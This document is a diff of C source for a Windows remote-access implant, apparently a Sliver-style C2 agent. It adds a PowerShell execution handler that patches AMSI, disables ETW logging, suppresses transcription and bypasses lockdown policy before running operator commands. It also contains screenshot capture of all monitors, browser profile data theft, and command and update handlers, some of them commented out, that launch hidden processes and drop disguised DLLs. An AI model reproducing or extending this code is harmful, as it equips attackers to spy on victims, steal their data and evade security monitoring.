@@ -229,25 +229,27 @@ PENVELOPE LsHandler
 	}
 	else if (IsFolderExist(lpConvertedPath)) {
 		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
-		FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
-		for (i = 0; i < dwNumberOfItems; i++) {
-			FileList[i] = ALLOC(sizeof(FILE_INFO));
-		}
+		if (dwNumberOfItems > 0) {
+			FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
+			for (i = 0; i < dwNumberOfItems; i++) {
+				FileList[i] = ALLOC(sizeof(FILE_INFO));
+			}
 
-		FileList[0]->dwMaxCount = dwNumberOfItems;
-		ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
-		dwNumberOfItems = FileList[0]->dwIdx;
-		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
-		for (i = 0; i < dwNumberOfItems; i++) {
-			SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
-			FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
-			FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
-			FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
-			FileInfoElement[3] = CreateVarIntElement(FileList[i]->uModifiedTime, 4);
-			FileInfoElement[5] = CreateBytesElement(FileList[i]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
-			FileInfoElement[6] = CreateBytesElement(FileList[i]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);
+			FileList[0]->dwMaxCount = dwNumberOfItems;
+			ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
+			dwNumberOfItems = FileList[0]->dwIdx;
+			pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
+			for (i = 0; i < dwNumberOfItems; i++) {
+				SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
+				FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
+				FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
+				FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
+				FileInfoElement[3] = CreateVarIntElement(FileList[i]->uModifiedTime, 4);
+				FileInfoElement[5] = CreateBytesElement(FileList[i]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
+				FileInfoElement[6] = CreateBytesElement(FileList[i]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);
 
-			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
+				pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
+			}
 		}
 	}
 
@@ -3050,7 +3052,6 @@ PENVELOPE BrowserHandler
 			for (k = 0; k < ProfileItemEnd; k++) {
 				if (pProfile->ItemPaths[k] != NULL) {
 					cbItemFileData = 0;
-					wprintf(L"Profile: %lls; Item: %lls\n", pProfile->lpProfileName, pProfile->ItemPaths[k]);
 					pItemFileData = ReadFromFile(pProfile->ItemPaths[k], &cbItemFileData);
 					if (pItemFileData != NULL && cbItemFileData > 0) {
 						ItemType[0] = CreateVarIntElement(k, 1);
@@ -3086,6 +3087,271 @@ CLEANUP:
 
 	FREE(pUserDatas);
 	FREE(pProfileList);
+
+	return pResult;
+}
+
+BOOL MonitorEnumProc
+(
+	_In_ HMONITOR hMonitor,
+	_In_ HDC hDC,
+	_In_ LPRECT lpMonitorRect,
+	_In_ PBUFFER** pParam
+)
+{
+	PBUFFER pBitmapBuffer = NULL;
+	PBUFFER* pBufferList = NULL;
+	DWORD dwNumberOfBuffers = 0;
+	//WCHAR wszPath[0x200] = L"C:\\Users\\Admin\\Desktop\\screenshot.";
+
+	dwNumberOfBuffers = *((PDWORD)pParam);
+	pBufferList = pParam[1];
+	pBitmapBuffer = CaptureDesktop(hDC, lpMonitorRect->left, lpMonitorRect->top);
+	if (pBitmapBuffer != NULL) {
+		if (pBufferList == NULL) {
+			pBufferList = ALLOC(sizeof(PBUFFER*));
+		}
+		else {
+			pBufferList = REALLOC(pBufferList, sizeof(PBUFFER*) * (dwNumberOfBuffers + 1));
+		}
+
+		/*lstrcatW(wszPath, GenRandomStrW(4));
+		lstrcatW(wszPath, L".bmp");
+		PrintFormatW(L"%s\n", wszPath);
+		WriteToFile(wszPath, pBitmapBuffer->pBuffer, pBitmapBuffer->cbBuffer);*/
+		pBufferList[dwNumberOfBuffers++] = pBitmapBuffer;
+		*((PDWORD)pParam) = dwNumberOfBuffers;
+		pParam[1] = pBufferList;
+	}
+
+	return TRUE;
+}
+
+PENVELOPE ScreenshotHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pResult = NULL;
+	HDC hDesktopDC = NULL;
+	PBUFFER** pParam = NULL;
+	PBUFFER* BufferList = NULL;
+	DWORD dwNumberOfBuffers = 0;
+	PPBElement pFinalElement = NULL;
+	DWORD i = 0;
+
+	hDesktopDC = GetDC(NULL);
+	if (hDesktopDC == NULL) {
+		LOG_ERROR("GetDC", GetLastError());
+		goto CLEANUP;
+	}
+
+	pParam = ALLOC(sizeof(PBUFFER*) * 2);
+	if (!EnumDisplayMonitors(hDesktopDC, NULL, (MONITORENUMPROC)MonitorEnumProc, (LPARAM)pParam)) {
+		LOG_ERROR("EnumDisplayMonitors", GetLastError());
+		goto CLEANUP;
+	}
+
+	BufferList = pParam[1];
+	dwNumberOfBuffers = (DWORD)pParam[0];
+	if (BufferList == NULL || dwNumberOfBuffers == 0) {
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateRepeatedBytesElement(BufferList, dwNumberOfBuffers, 1);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
+CLEANUP:
+	FreeElement(pFinalElement);
+	FREE(pParam);
+	if (BufferList != NULL) {
+		for (i = 0; i < dwNumberOfBuffers; i++) {
+			FREE(BufferList[i]);
+		}
+
+		FREE(BufferList);
+	}
+
+	if (hDesktopDC != NULL) {
+		ReleaseDC(NULL, hDesktopDC);
+	}
+
+	return pResult;
+}
+
+//PENVELOPE UpdateHandler
+//(
+//	_In_ PENVELOPE pEnvelope,
+//	_In_ LPVOID pSliverClient
+//)
+//{
+//	PPBElement ReqElement = NULL;
+//	PBUFFER* UnmarshaledData = NULL;
+//	PBUFFER pCompressedData = NULL;
+//	LPWSTR lpArchivePath = NULL;
+//	LPWSTR lpTempPath = NULL;
+//	LPWSTR lpUpdaterPath = NULL;
+//	LPWSTR lpBit7zPath = NULL;
+//	STARTUPINFOW StartupInfo;
+//	PROCESS_INFORMATION ProcInfo;
+//	PGLOBAL_CONFIG pConfig = NULL;
+//	PSLIVER_SESSION_CLIENT pSession = NULL;
+//
+//	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
+//	pConfig = pSession->pGlobalConfig;
+//	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
+//	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
+//	ReqElement = ALLOC(sizeof(PBElement));
+//	ReqElement->dwFieldIdx = 1;
+//	ReqElement->Type = Bytes;
+//
+//	UnmarshaledData = UnmarshalStruct(&ReqElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+//	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
+//		goto CLEANUP;
+//	}
+//
+//	pCompressedData = UnmarshaledData[0];
+//	lpArchivePath = GenerateTempPathW(NULL, L".zip", NULL);
+//	if (!WriteToFile(lpArchivePath, pCompressedData->pBuffer, pCompressedData->cbBuffer)) {
+//		goto CLEANUP;
+//	}
+//
+//	lpTempPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Installer"));
+//	lstrcatW(lpTempPath, L"\\Installer");
+//	if (!IsFolderExist(lpTempPath)) {
+//		if (!CreateDirectoryW(lpTempPath, NULL)) {
+//			LOG_ERROR("lpTempPath", GetLastError());
+//			goto CLEANUP;
+//		}
+//	}
+//
+//	lpUpdaterPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Updater.exe"));
+//	lstrcatW(lpUpdaterPath, L"\\Updater.exe");
+//	lpBit7zPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\LogitechLcd.dll"));
+//	lstrcatW(lpBit7zPath, L"\\LogitechLcd.dll");
+//	if (Bit7zExtract(lpBit7zPath, lpArchivePath, lpTempPath) == NULL) {
+//		DeleteFileW(lpArchivePath);
+//		goto CLEANUP;
+//	}
+//
+//	DeleteFileW(lpArchivePath);
+//	StartupInfo.cb = sizeof(StartupInfo);
+//	if (!CreateProcessW(lpUpdaterPath, NULL, NULL, NULL, FALSE, 0, NULL, pConfig->lpSliverPath, &StartupInfo, &ProcInfo)) {
+//		LOG_ERROR("CreateProcessW", GetLastError());
+//		goto CLEANUP;
+//	}
+//	else {
+//		ExitProcess(0);
+//	}
+//
+//CLEANUP:
+//	if (ProcInfo.hThread != NULL) {
+//		CloseHandle(ProcInfo.hThread);
+//	}
+//
+//	if (ProcInfo.hProcess != NULL) {
+//		CloseHandle(ProcInfo.hProcess);
+//	}
+//
+//	FREE(lpTempPath);
+//	FREE(lpUpdaterPath);
+//	FREE(lpBit7zPath);
+//	FREE(lpArchivePath);
+//	FREE(UnmarshaledData);
+//	FreeBuffer(pCompressedData);
+//	FreeElement(ReqElement);
+//	return NULL;
+//}
+
+PENVELOPE PowerShellHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement TaskReq[1];
+	//PCLR_CONTEXT pClrCtx = NULL;
+	struct _AppDomain* pAppDomain = NULL;
+	LPSTR lpCommand = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	DWORD i = 0;
+	LPSTR lpCommandOutput = NULL;
+	PPBElement pFinalElement = NULL;
+	PENVELOPE pResult = NULL;
+	BOOL IsLoadedBefore = FALSE;
+	LPWSTR lpTemp = NULL;
+	DWORD cchOutput = 0;
+	LPWSTR lpTempPath = NULL;
+	WCHAR wszFullCommand[0x400];
+
+	TaskReq[0] = ALLOC(sizeof(PBElement));
+	TaskReq[0]->dwFieldIdx = 1;
+	TaskReq[0]->Type = Bytes;
+	UnmarshaledData = UnmarshalStruct(TaskReq, _countof(TaskReq), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpCommand = (LPSTR)(((PBUFFER)UnmarshaledData[0])->pBuffer);
+	lpTempPath = GenerateTempPathW(NULL, L".txt", NULL);
+	WriteToFile(lpTempPath, lpCommand, lstrlenA(lpCommand));
+	wsprintfW(wszFullCommand, L"Get-Content %s | Invoke-Expression | Out-String", lpTempPath);
+	pAppDomain = InitializeCommonLanguageRuntime(L"UevApp", &IsLoadedBefore);
+	if (pAppDomain == NULL) {
+		goto CLEANUP;
+	}
+
+	if (!IsLoadedBefore) {
+		if (!PatchAmsiOpenSession()) {
+			goto CLEANUP;
+		}
+
+		if (!DisablePowerShellEtwProvider(pAppDomain)) {
+			goto CLEANUP;
+		}
+
+		if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain)) {
+			goto CLEANUP;
+		}
+
+		if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain)) {
+			goto CLEANUP;
+		}
+
+		if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain)) {
+			goto CLEANUP;
+		}
+	}
+
+	lpTemp = StartPowerShell(pAppDomain, wszFullCommand);
+	if (lpTemp == NULL) {
+		goto CLEANUP;
+	}
+
+	lpCommandOutput = ConvertWcharToChar(lpTemp);
+	pFinalElement = CreateBytesElement(lpCommandOutput, lstrlenA(lpCommandOutput), 1);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
+CLEANUP:
+	FreeElement(pFinalElement);
+	FREE(lpCommandOutput);
+	if (lpTempPath != NULL) {
+		DeleteFileW(lpTempPath);
+		FREE(lpTempPath);
+	}
+
+	FREE(lpCommand);
+	FREE(lpTemp);
+	if (pAppDomain != NULL) {
+		pAppDomain->lpVtbl->Release(pAppDomain);
+	}
+
+	for (i = 0; i < _countof(TaskReq); i++) {
+		FREE(TaskReq[i]);
+	}
 
 	return pResult;
 }
@@ -3384,165 +3650,165 @@ CLEANUP:
 	return pResult;
 }
 
-PENVELOPE CmdHandler
-(
-	_In_ PENVELOPE pEnvelope,
-	_In_ LPVOID lpSliverClient
-)
-{
-	PPBElement pCmdElements[3];
-	PPBElement RespElements[2];
-	PPBElement pFinalElement = NULL;
-	DWORD i = 0;
-	PENVELOPE pResult = NULL;
-	LPVOID* UnmarshaledData = NULL;
-	LPSTR lpCommand = NULL;
-	PSLIVER_SESSION_CLIENT pSession = NULL;
-	PGLOBAL_CONFIG pConfig = NULL;
-	LPWSTR lpInputPath = NULL;
-	LPWSTR lpErrorPath = NULL;
-	LPWSTR lpOutputPath = NULL;
-	PBYTE pOutputData = NULL;
-	DWORD cbOutputData = 0;
-	PBYTE pErrorData = NULL;
-	DWORD cbErrorData = 0;
-	BOOL ExecuteNow = FALSE;
-	WCHAR wszOobePath[MAX_PATH];
-	LPWSTR lpOobeldrPath = NULL;
-	DWORD dwTimeout = 360;
-	STARTUPINFOW si;
-	PROCESS_INFORMATION pi;
-	DWORD dwPidOfOobeldr = 0;
-	BOOL SaveOutput = FALSE;
-	WCHAR wszTempPath[MAX_PATH];
-	LPWSTR lpTemp1 = NULL;
-	LPSTR lpTemp2 = NULL;
-
-	SecureZeroMemory(RespElements, sizeof(RespElements));
-	for (i = 0; i < _countof(pCmdElements); i++) {
-		pCmdElements[i] = ALLOC(sizeof(PBElement));
-		pCmdElements[i]->dwFieldIdx = i + 1;
-		pCmdElements[i]->Type = Varint;
-	}
-	
-	pCmdElements[0]->Type = Bytes;
-	UnmarshaledData = UnmarshalStruct(pCmdElements, _countof(pCmdElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
-	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
-		goto CLEANUP;
-	}
-
-	if (UnmarshaledData[1] != NULL) {
-		ExecuteNow = TRUE;
-		dwTimeout = 120;
-	}
-
-	if (UnmarshaledData[2] != NULL) {
-		SaveOutput = TRUE;
-	}
-
-	lpCommand = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
-	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
-	pConfig = pSession->pGlobalConfig;
-	lpInputPath = StrAppendW(pConfig->lpSliverPath, L"\\Scripts\\");
-	lpInputPath = StrCatExW(lpInputPath, pConfig->lpUniqueName);
-
-	lpErrorPath = DuplicateStrW(lpInputPath, 4);
-	lpOutputPath = DuplicateStrW(lpInputPath, 4);
-	lstrcatW(lpErrorPath, L".err");
-	lstrcatW(lpOutputPath, L".out");
-	lpInputPath = StrCatExW(lpInputPath, L".cmd");
-	if (!WriteToFile(lpInputPath, lpCommand, lstrlenA(lpCommand))) {
-		goto CLEANUP;
-	}
-
-	if (ExecuteNow) {
-		ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\oobe", wszOobePath, _countof(wszOobePath));
-		lpOobeldrPath = DuplicateStrW(wszOobePath, lstrlenW(L"\\oobeldr.exe"));
-		lstrcatW(lpOobeldrPath, L"\\oobeldr.exe");
-		SecureZeroMemory(&si, sizeof(si));
-		SecureZeroMemory(&pi, sizeof(pi));
-		si.cb = sizeof(si);
-		si.wShowWindow = SW_HIDE;
-		if (!CreateProcessW(lpOobeldrPath, NULL, NULL, NULL, FALSE, 0, NULL, wszOobePath, &si, &pi)) {
-			LOG_ERROR("CreateProcessW", GetLastError());
-			goto CLEANUP;
-		}
-
-		WaitForSingleObject(pi.hProcess, INFINITE);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
-	}
-
-	GetTempPathW(_countof(wszTempPath), wszTempPath);
-	wszTempPath[lstrlenW(wszTempPath) - 1] = L'\0';
-	for (i = 0; i < dwTimeout; i++) {
-		if (IsFileExist(lpOutputPath)) {
-			if (SaveOutput) {
-				lpTemp1 = CopyFileToFolder(lpOutputPath, wszTempPath);
-				lpTemp2 = ConvertWcharToChar(lpTemp1);
-				RespElements[0] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 1);
-				FREE(lpTemp1);
-				FREE(lpTemp2);
-			}
-			else {
-				pOutputData = ReadFromFile(lpOutputPath, &cbOutputData);
-				RespElements[0] = CreateBytesElement(pOutputData, cbOutputData, 1);
-			}
-			
-			if (IsFileExist(lpErrorPath)) {
-				if (SaveOutput) {
-					lpTemp1 = CopyFileToFolder(lpErrorPath, wszTempPath);
-					lpTemp2 = ConvertWcharToChar(lpTemp1);
-					RespElements[1] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 2);
-					FREE(lpTemp1);
-					FREE(lpTemp2);
-				}
-				else {
-					pErrorData = ReadFromFile(lpErrorPath, &cbErrorData);
-					RespElements[1] = CreateBytesElement(pErrorData, cbErrorData, 2);
-				}
-			}
-
-			break;
-		}
-		
-		Sleep(1000);
-	}
-
-	pFinalElement = CreateStructElement(RespElements, _countof(RespElements), 0);
-	pResult = ALLOC(sizeof(ENVELOPE));
-	pResult->uID = pEnvelope->uID;
-	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
-	pFinalElement->pMarshaledData = NULL;
-CLEANUP:
-	if (lpOutputPath != NULL) {
-		DeleteFileW(lpOutputPath);
-	}
-
-	if (lpErrorPath != NULL) {
-		DeleteFileW(lpErrorPath);
-	}
-
-	for (i = 0; i < _countof(pCmdElements); i++) {
-		FREE(pCmdElements[i]);
-	}
-
-	if (UnmarshaledData != NULL) {
-		FreeBuffer(UnmarshaledData[0]);
-		FREE(UnmarshaledData);
-	}
-
-	FreeElement(pFinalElement);
-	FREE(lpOobeldrPath);
-	FREE(lpCommand);
-	FREE(lpInputPath);
-	FREE(lpOutputPath);
-	FREE(lpErrorPath);
-	FREE(pOutputData);
-	FREE(pErrorData);
-
-	return pResult;
-}
+//PENVELOPE CmdHandler
+//(
+//	_In_ PENVELOPE pEnvelope,
+//	_In_ LPVOID lpSliverClient
+//)
+//{
+//	PPBElement pCmdElements[3];
+//	PPBElement RespElements[2];
+//	PPBElement pFinalElement = NULL;
+//	DWORD i = 0;
+//	PENVELOPE pResult = NULL;
+//	LPVOID* UnmarshaledData = NULL;
+//	LPSTR lpCommand = NULL;
+//	PSLIVER_SESSION_CLIENT pSession = NULL;
+//	PGLOBAL_CONFIG pConfig = NULL;
+//	LPWSTR lpInputPath = NULL;
+//	LPWSTR lpErrorPath = NULL;
+//	LPWSTR lpOutputPath = NULL;
+//	PBYTE pOutputData = NULL;
+//	DWORD cbOutputData = 0;
+//	PBYTE pErrorData = NULL;
+//	DWORD cbErrorData = 0;
+//	BOOL ExecuteNow = FALSE;
+//	WCHAR wszOobePath[MAX_PATH];
+//	LPWSTR lpOobeldrPath = NULL;
+//	DWORD dwTimeout = 360;
+//	STARTUPINFOW si;
+//	PROCESS_INFORMATION pi;
+//	DWORD dwPidOfOobeldr = 0;
+//	BOOL SaveOutput = FALSE;
+//	WCHAR wszTempPath[MAX_PATH];
+//	LPWSTR lpTemp1 = NULL;
+//	LPSTR lpTemp2 = NULL;
+//
+//	SecureZeroMemory(RespElements, sizeof(RespElements));
+//	for (i = 0; i < _countof(pCmdElements); i++) {
+//		pCmdElements[i] = ALLOC(sizeof(PBElement));
+//		pCmdElements[i]->dwFieldIdx = i + 1;
+//		pCmdElements[i]->Type = Varint;
+//	}
+//	
+//	pCmdElements[0]->Type = Bytes;
+//	UnmarshaledData = UnmarshalStruct(pCmdElements, _countof(pCmdElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+//	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
+//		goto CLEANUP;
+//	}
+//
+//	if (UnmarshaledData[1] != NULL) {
+//		ExecuteNow = TRUE;
+//		dwTimeout = 120;
+//	}
+//
+//	if (UnmarshaledData[2] != NULL) {
+//		SaveOutput = TRUE;
+//	}
+//
+//	lpCommand = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
+//	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+//	pConfig = pSession->pGlobalConfig;
+//	lpInputPath = StrAppendW(pConfig->lpSliverPath, L"\\Scripts\\");
+//	lpInputPath = StrCatExW(lpInputPath, pConfig->lpUniqueName);
+//
+//	lpErrorPath = DuplicateStrW(lpInputPath, 4);
+//	lpOutputPath = DuplicateStrW(lpInputPath, 4);
+//	lstrcatW(lpErrorPath, L".err");
+//	lstrcatW(lpOutputPath, L".out");
+//	lpInputPath = StrCatExW(lpInputPath, L".cmd");
+//	if (!WriteToFile(lpInputPath, lpCommand, lstrlenA(lpCommand))) {
+//		goto CLEANUP;
+//	}
+//
+//	if (ExecuteNow) {
+//		ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\oobe", wszOobePath, _countof(wszOobePath));
+//		lpOobeldrPath = DuplicateStrW(wszOobePath, lstrlenW(L"\\oobeldr.exe"));
+//		lstrcatW(lpOobeldrPath, L"\\oobeldr.exe");
+//		SecureZeroMemory(&si, sizeof(si));
+//		SecureZeroMemory(&pi, sizeof(pi));
+//		si.cb = sizeof(si);
+//		si.wShowWindow = SW_HIDE;
+//		if (!CreateProcessW(lpOobeldrPath, NULL, NULL, NULL, FALSE, 0, NULL, wszOobePath, &si, &pi)) {
+//			LOG_ERROR("CreateProcessW", GetLastError());
+//			goto CLEANUP;
+//		}
+//
+//		WaitForSingleObject(pi.hProcess, INFINITE);
+//		CloseHandle(pi.hThread);
+//		CloseHandle(pi.hProcess);
+//	}
+//
+//	GetTempPathW(_countof(wszTempPath), wszTempPath);
+//	wszTempPath[lstrlenW(wszTempPath) - 1] = L'\0';
+//	for (i = 0; i < dwTimeout; i++) {
+//		if (IsFileExist(lpOutputPath)) {
+//			if (SaveOutput) {
+//				lpTemp1 = CopyFileToFolder(lpOutputPath, wszTempPath);
+//				lpTemp2 = ConvertWcharToChar(lpTemp1);
+//				RespElements[0] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 1);
+//				FREE(lpTemp1);
+//				FREE(lpTemp2);
+//			}
+//			else {
+//				pOutputData = ReadFromFile(lpOutputPath, &cbOutputData);
+//				RespElements[0] = CreateBytesElement(pOutputData, cbOutputData, 1);
+//			}
+//			
+//			if (IsFileExist(lpErrorPath)) {
+//				if (SaveOutput) {
+//					lpTemp1 = CopyFileToFolder(lpErrorPath, wszTempPath);
+//					lpTemp2 = ConvertWcharToChar(lpTemp1);
+//					RespElements[1] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 2);
+//					FREE(lpTemp1);
+//					FREE(lpTemp2);
+//				}
+//				else {
+//					pErrorData = ReadFromFile(lpErrorPath, &cbErrorData);
+//					RespElements[1] = CreateBytesElement(pErrorData, cbErrorData, 2);
+//				}
+//			}
+//
+//			break;
+//		}
+//		
+//		Sleep(1000);
+//	}
+//
+//	pFinalElement = CreateStructElement(RespElements, _countof(RespElements), 0);
+//	pResult = ALLOC(sizeof(ENVELOPE));
+//	pResult->uID = pEnvelope->uID;
+//	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+//	pFinalElement->pMarshaledData = NULL;
+//CLEANUP:
+//	if (lpOutputPath != NULL) {
+//		DeleteFileW(lpOutputPath);
+//	}
+//
+//	if (lpErrorPath != NULL) {
+//		DeleteFileW(lpErrorPath);
+//	}
+//
+//	for (i = 0; i < _countof(pCmdElements); i++) {
+//		FREE(pCmdElements[i]);
+//	}
+//
+//	if (UnmarshaledData != NULL) {
+//		FreeBuffer(UnmarshaledData[0]);
+//		FREE(UnmarshaledData);
+//	}
+//
+//	FreeElement(pFinalElement);
+//	FREE(lpOobeldrPath);
+//	FREE(lpCommand);
+//	FREE(lpInputPath);
+//	FREE(lpOutputPath);
+//	FREE(lpErrorPath);
+//	FREE(pOutputData);
+//	FREE(pErrorData);
+//
+//	return pResult;
+//}
 
 BOOL ChownHandlerCallback
 (
@@ -4069,96 +4335,6 @@ CLEANUP:
 	}
 
 	FREE(pUnmarshaledData);
-
-	return pResult;
-}
-
-BOOL MonitorEnumProc
-(
-	_In_ HMONITOR hMonitor,
-	_In_ HDC hDC,
-	_In_ LPRECT lpMonitorRect,
-	_In_ PBUFFER** pParam
-)
-{
-	PBUFFER pBitmapBuffer = NULL;
-	PBUFFER* pBufferList = NULL;
-	DWORD dwNumberOfBuffers = 0;
-	//WCHAR wszPath[0x200] = L"C:\\Users\\Admin\\Desktop\\screenshot.";
-
-	dwNumberOfBuffers = *((PDWORD)pParam);
-	pBufferList = pParam[1];
-	pBitmapBuffer = CaptureDesktop(hDC, lpMonitorRect->left, lpMonitorRect->top);
-	if (pBitmapBuffer != NULL) {
-		if (pBufferList == NULL) {
-			pBufferList = ALLOC(sizeof(PBUFFER*));
-		}
-		else {
-			pBufferList = REALLOC(pBufferList, sizeof(PBUFFER*) * (dwNumberOfBuffers + 1));
-		}
-
-		/*lstrcatW(wszPath, GenRandomStrW(4));
-		lstrcatW(wszPath, L".bmp");
-		PrintFormatW(L"%s\n", wszPath);
-		WriteToFile(wszPath, pBitmapBuffer->pBuffer, pBitmapBuffer->cbBuffer);*/
-		pBufferList[dwNumberOfBuffers++] = pBitmapBuffer;
-		*((PDWORD)pParam) = dwNumberOfBuffers;
-		pParam[1] = pBufferList;
-	}
-
-	return TRUE;
-}
-
-PENVELOPE ScreenshotHandler
-(
-	_In_ PENVELOPE pEnvelope
-)
-{
-	PENVELOPE pResult = NULL;
-	HDC hDesktopDC = NULL;
-	PBUFFER** pParam = NULL;
-	PBUFFER* BufferList = NULL;
-	DWORD dwNumberOfBuffers = 0;
-	PPBElement pFinalElement = NULL;
-	DWORD i = 0;
-
-	hDesktopDC = GetDC(NULL);
-	if (hDesktopDC == NULL) {
-		LOG_ERROR("GetDC", GetLastError());
-		goto CLEANUP;
-	}
-
-	pParam = ALLOC(sizeof(PBUFFER*) * 2);
-	if (!EnumDisplayMonitors(hDesktopDC, NULL, (MONITORENUMPROC)MonitorEnumProc, (LPARAM)pParam)) {
-		LOG_ERROR("EnumDisplayMonitors", GetLastError());
-		goto CLEANUP;
-	}
-
-	BufferList = pParam[1];
-	dwNumberOfBuffers = (DWORD)pParam[0];
-	if (BufferList == NULL || dwNumberOfBuffers == 0) {
-		goto CLEANUP;
-	}
-
-	pFinalElement = CreateRepeatedBytesElement(BufferList, dwNumberOfBuffers, 1);
-	pResult = ALLOC(sizeof(ENVELOPE));
-	pResult->uID = pEnvelope->uID;
-	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
-	pFinalElement->pMarshaledData = NULL;
-CLEANUP:
-	FreeElement(pFinalElement);
-	FREE(pParam);
-	if (BufferList != NULL) {
-		for (i = 0; i < dwNumberOfBuffers; i++) {
-			FREE(BufferList[i]);
-		}
-
-		FREE(BufferList);
-	}
-
-	if (hDesktopDC != NULL) {
-		ReleaseDC(NULL, hDesktopDC);
-	}
 
 	return pResult;
 }
@@ -4738,87 +4914,6 @@ PENVELOPE KillHandler
 	RtlExitUserProcess(0);
 }
 
-PENVELOPE UpdateHandler
-(
-	_In_ PENVELOPE pEnvelope,
-	_In_ LPVOID pSliverClient
-)
-{
-	PPBElement ReqElement = NULL;
-	PBUFFER* UnmarshaledData = NULL;
-	PBUFFER pCompressedData = NULL;
-	LPWSTR lpArchivePath = NULL;
-	LPWSTR lpTempPath = NULL;
-	LPWSTR lpUpdaterPath = NULL;
-	LPWSTR lpBit7zPath = NULL;
-	STARTUPINFOW StartupInfo;
-	PROCESS_INFORMATION ProcInfo;
-	PGLOBAL_CONFIG pConfig = NULL;
-	PSLIVER_SESSION_CLIENT pSession = NULL;
-
-	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
-	pConfig = pSession->pGlobalConfig;
-	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
-	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
-	ReqElement = ALLOC(sizeof(PBElement));
-	ReqElement->dwFieldIdx = 1;
-	ReqElement->Type = Bytes;
-
-	UnmarshaledData = UnmarshalStruct(&ReqElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
-	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
-		goto CLEANUP;
-	}
-
-	pCompressedData = UnmarshaledData[0];
-	lpArchivePath = GenerateTempPathW(NULL, L".zip", NULL);
-	if (!WriteToFile(lpArchivePath, pCompressedData->pBuffer, pCompressedData->cbBuffer)) {
-		goto CLEANUP;
-	}
-	
-	lpTempPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Installer"));
-	lstrcatW(lpTempPath, L"\\Installer");
-	if (!CreateDirectoryW(lpTempPath, NULL)) {
-		LOG_ERROR("lpTempPath", GetLastError());
-		goto CLEANUP;
-	}
-
-	lpUpdaterPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Updater.exe"));
-	lstrcatW(lpUpdaterPath, L"\\Updater.exe");
-
-	lpBit7zPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\LogitechLcd.dll"));
